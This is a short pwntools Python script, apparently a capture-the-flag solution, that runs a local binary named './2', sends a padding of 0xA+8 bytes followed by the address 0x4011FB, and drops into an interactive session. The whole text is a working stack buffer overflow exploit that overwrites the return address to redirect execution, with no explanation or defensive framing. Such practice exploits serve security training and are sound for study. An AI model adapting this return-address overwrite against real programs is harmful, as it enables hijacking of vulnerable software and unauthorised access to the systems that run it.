from pwn import*
p=process('./2')

payload=b'a'*(0xA+8)+p64(0x4011FB)

p.sendline(payload)
p.interactive()
